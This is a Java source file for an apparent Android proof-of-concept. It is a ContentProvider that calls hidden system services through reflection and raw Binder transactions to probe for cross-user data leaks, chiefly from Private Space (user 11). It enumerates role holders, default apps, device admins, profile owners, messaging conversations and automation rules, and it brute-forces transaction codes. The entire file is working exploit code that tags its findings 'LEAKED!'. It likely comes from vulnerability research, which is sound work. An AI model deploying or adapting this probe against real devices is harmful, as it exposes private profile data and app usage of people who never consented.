package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class PendingIntentProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("notification")) {
            probeNotificationListenerService(cursor);
        } else if (path != null && path.contains("device_policy")) {
            probeDevicePolicy(cursor);
        } else if (path != null && path.contains("dreams")) {
            probeDreamService(cursor);
        } else if (path != null && path.contains("role")) {
            probeRoleManager(cursor);
        } else if (path != null && path.contains("slice")) {
            probeSliceManager(cursor);
        } else {
            probeNotificationListenerService(cursor);
            probeDevicePolicy(cursor);
            probeDreamService(cursor);
            probeRoleManager(cursor);
            probeSliceManager(cursor);
        }

        return cursor;
    }

    private void probeNotificationListenerService(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("notification");
        if (binder == null) { cursor.addRow(new Object[]{"notification", "no_binder"}); return; }
        String desc = "android.app.INotificationManager";

        // INotificationManager — HIGH VALUE:
        // TX=62: getActiveNotifications(String callingPkg) — OWN notifications
        // TX=63: getHistoricalNotifications(String callingPkg, int count, boolean includeSnoozed)
        //   ^^ If accessible for other packages = MASSIVE data leak
        // TX=65: getNotificationChannel(String pkg, int uid, String channelId)
        //   ^^ Cross-app channel information
        // TX=72: getActiveNotificationsFromListener — requires listener
        // TX=84: isNotificationPolicyAccessGranted(String pkg) — reveals DND access
        // TX=93: getAutomaticZenRules() — reveals automation rules (contains app info)
        // TX=112: getConversations(boolean onlyImportant) — reveals messaging contacts!

        // TX=62: getActiveNotifications for own package
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            binder.transact(62, data, reply, 0);
            reply.readException();
            // ParceledListSlice<StatusBarNotification>
            int count = reply.readInt();
            cursor.addRow(new Object[]{"notif_active_own", "count=" + count});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"notif_active_own", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=63: getHistoricalNotifications — try for own package
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeInt(50); // count
            data.writeInt(0); // includeSnoozed=false
            binder.transact(63, data, reply, 0);
            reply.readException();
            // StatusBarNotification[]
            int len = reply.readInt();
            cursor.addRow(new Object[]{"notif_history", "count=" + len});
            if (len > 0) {
                cursor.addRow(new Object[]{"notif_history", "GOT_HISTORY! " + len + " notifications"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"notif_history", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=93: getAutomaticZenRules — reveals which apps have DND automation
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(93, data, reply, 0);
            reply.readException();
            // List<AutomaticZenRule>
            int count = reply.readInt();
            cursor.addRow(new Object[]{"zen_rules", "count=" + count});
            if (count > 0) {
                cursor.addRow(new Object[]{"zen_rules", "LEAKED! " + count + " automation rules"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"zen_rules", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=112: getConversations — reveals messaging contacts
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // onlyImportant=false
            binder.transact(112, data, reply, 0);
            reply.readException();
            int count = reply.readInt();
            cursor.addRow(new Object[]{"conversations", "count=" + count});
            if (count > 0) {
                cursor.addRow(new Object[]{"conversations",
                    "MESSAGING_CONTACTS_LEAK! " + count + " conversations!"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"conversations", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // Scan TX 100-120 for more accessible methods
        for (int tx = 100; tx <= 120; tx++) {
            if (tx == 112) continue;
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 4) {
                            cursor.addRow(new Object[]{"notif_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        // skip
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"notif_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeDevicePolicy(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("device_policy");
        if (binder == null) { cursor.addRow(new Object[]{"device_policy", "no_binder"}); return; }
        String desc = "android.app.admin.IDevicePolicyManager";

        // IDevicePolicyManager — VERY large interface (200+ TX codes)
        // Key ones for info leak:
        // TX=24: getActiveAdmins(int userHandle) — reveals device admin apps
        // TX=75: getDeviceOwnerComponent(boolean calledByDeviceOwner)
        // TX=76: getDeviceOwnerName() — reveals MDM
        // TX=84: getProfileOwner(int userHandle) — reveals work profile owner
        // TX=85: getProfileOwnerName(int userHandle)
        // TX=142: isDeviceProvisioned() — device state

        // TX=24: getActiveAdmins
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(24, data, reply, 0);
                reply.readException();
                // List<ComponentName>
                int count = reply.readInt();
                cursor.addRow(new Object[]{"admins_u" + userId, "count=" + count});
                if (count > 0 && userId == 11) {
                    cursor.addRow(new Object[]{"admins_u11", "PRIVATE_SPACE_ADMIN_LEAK! count=" + count});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"admins_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=75: getDeviceOwnerComponent
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // calledByDeviceOwner=false
            binder.transact(75, data, reply, 0);
            reply.readException();
            int present = reply.readInt();
            if (present != 0) {
                String pkg = reply.readString();
                String cls = reply.readString();
                cursor.addRow(new Object[]{"device_owner", pkg + "/" + cls});
            } else {
                cursor.addRow(new Object[]{"device_owner", "none"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"device_owner", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=84: getProfileOwner for user 11 (Private Space)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(11);
            binder.transact(84, data, reply, 0);
            reply.readException();
            int present = reply.readInt();
            if (present != 0) {
                String pkg = reply.readString();
                String cls = reply.readString();
                cursor.addRow(new Object[]{"profile_owner_u11", pkg + "/" + cls});
            } else {
                cursor.addRow(new Object[]{"profile_owner_u11", "none"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"profile_owner_u11", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeDreamService(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("dreams");
        if (binder == null) { cursor.addRow(new Object[]{"dreams", "no_binder"}); return; }
        String desc = "android.service.dreams.IDreamManager";

        // IDreamManager:
        // TX=1: dream() — start dream (screensaver)
        // TX=2: awaken() — wake from dream
        // TX=3: isDreaming() — device state
        // TX=4: getDreamComponents() — reveals screensaver apps
        // TX=5: getDefaultDreamComponent() — reveals default screensaver
        // TX=8: getDreamComponentsForUser(int userId)
        //   ^^ cross-user info leak!

        // TX=3: isDreaming
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(3, data, reply, 0);
            reply.readException();
            boolean dreaming = reply.readInt() != 0;
            cursor.addRow(new Object[]{"isDreaming", String.valueOf(dreaming)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"isDreaming", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=4: getDreamComponents
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(4, data, reply, 0);
            reply.readException();
            // ComponentName[]
            int count = reply.readInt();
            cursor.addRow(new Object[]{"dream_components", "count=" + count});
            if (count > 0 && count < 20) {
                for (int i = 0; i < Math.min(count, 5); i++) {
                    int present = reply.readInt();
                    if (present != 0) {
                        String pkg = reply.readString();
                        String cls = reply.readString();
                        cursor.addRow(new Object[]{"dream_" + i, pkg + "/" + cls});
                    }
                }
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"dream_components", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=8: getDreamComponentsForUser — cross-user
        for (int userId : new int[]{0, 11}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                binder.transact(8, data, reply, 0);
                reply.readException();
                int count = reply.readInt();
                cursor.addRow(new Object[]{"dream_u" + userId, "count=" + count});
                if (count > 0 && userId == 11) {
                    cursor.addRow(new Object[]{"dream_u11",
                        "CROSS_USER! private space screensaver leaked"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"dream_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeRoleManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("role");
        if (binder == null) { cursor.addRow(new Object[]{"role", "no_binder"}); return; }
        String desc = "android.app.role.IRoleManager";

        // IRoleManager:
        // TX=1: isRoleAvailable(String roleName) — info
        // TX=2: isRoleHeld(String roleName, String packageName) — check if app holds role
        // TX=3: getRoleHoldersAsUser(String roleName, int userId) — CROSS-USER!
        //   ^^ reveals which apps hold roles in private space (browser, SMS, dialer, etc)
        // TX=7: getDefaultApplication(String roleName, int userId)

        String[] roles = {"android.app.role.BROWSER", "android.app.role.SMS",
            "android.app.role.DIALER", "android.app.role.HOME",
            "android.app.role.ASSISTANT", "android.app.role.EMERGENCY",
            "android.app.role.SYSTEM_GALLERY", "android.app.role.NOTES"};

        // TX=3: getRoleHoldersAsUser for user 11 (Private Space)
        for (String role : roles) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(role);
                data.writeInt(11); // userId = Private Space
                binder.transact(3, data, reply, 0);
                reply.readException();
                // List<String> packageNames
                int count = reply.readInt();
                if (count > 0 && count < 100) {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < Math.min(count, 5); i++) {
                        sb.append(reply.readString()).append(",");
                    }
                    String roleName = role.substring(role.lastIndexOf('.') + 1);
                    cursor.addRow(new Object[]{"role_u11_" + roleName,
                        "LEAKED! " + sb.toString()});
                } else if (count == 0) {
                    cursor.addRow(new Object[]{"role_u11_" + role.substring(role.lastIndexOf('.') + 1), "empty"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"role_u11_" + role.substring(role.lastIndexOf('.') + 1),
                    "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=7: getDefaultApplication for user 11
        for (String role : roles) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(role);
                data.writeInt(11); // userId
                binder.transact(7, data, reply, 0);
                reply.readException();
                String defaultApp = reply.readString();
                if (defaultApp != null && !defaultApp.isEmpty()) {
                    String roleName = role.substring(role.lastIndexOf('.') + 1);
                    cursor.addRow(new Object[]{"default_u11_" + roleName,
                        "LEAKED! " + defaultApp});
                }
            } catch (Exception e) {
                String roleName = role.substring(role.lastIndexOf('.') + 1);
                cursor.addRow(new Object[]{"default_u11_" + roleName,
                    "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeSliceManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("slice");
        if (binder == null) { cursor.addRow(new Object[]{"slice", "no_binder"}); return; }
        String desc = "android.app.slice.ISliceManager";

        // ISliceManager:
        // TX=1: pinSlice(String pkg, Uri sliceUri, SliceSpec[], IBinder)
        // TX=5: getSliceDescendants(Uri) — enumerate available slices
        // TX=7: grantPermissionFromUser(Uri, String pkg, String providerPkg, boolean)
        // TX=9: getPinnedSlices(String pkg)

        // TX=5: getSliceDescendants — try to enumerate Settings slices
        String[] sliceUris = {
            "content://com.android.settings.slices/",
            "content://android.settings.slices/",
            "content://com.google.android.gms/",
        };

        for (String sliceUri : sliceUris) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                // Uri
                data.writeInt(1); // present
                Uri u = Uri.parse(sliceUri);
                u.writeToParcel(data, 0);
                binder.transact(5, data, reply, 0);
                reply.readException();
                int count = reply.readInt();
                String shortUri = sliceUri.replace("content://", "").replace("com.", "").replace("android.", "");
                cursor.addRow(new Object[]{"slices_" + shortUri.replace("/", ""), "count=" + count});
                if (count > 0 && count < 500) {
                    for (int i = 0; i < Math.min(count, 10); i++) {
                        try {
                            int present = reply.readInt();
                            if (present != 0) {
                                Uri uri2 = Uri.CREATOR.createFromParcel(reply);
                                cursor.addRow(new Object[]{"slice_" + i, uri2.toString()});
                            }
                        } catch (Exception ignored) { break; }
                    }
                    if (count > 10) {
                        cursor.addRow(new Object[]{"slices_more", "+" + (count - 10) + " more"});
                    }
                }
            } catch (Exception e) {
                String shortUri = sliceUri.replace("content://", "").replace("com.", "").replace("android.", "");
                cursor.addRow(new Object[]{"slices_" + shortUri.replace("/", ""),
                    "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
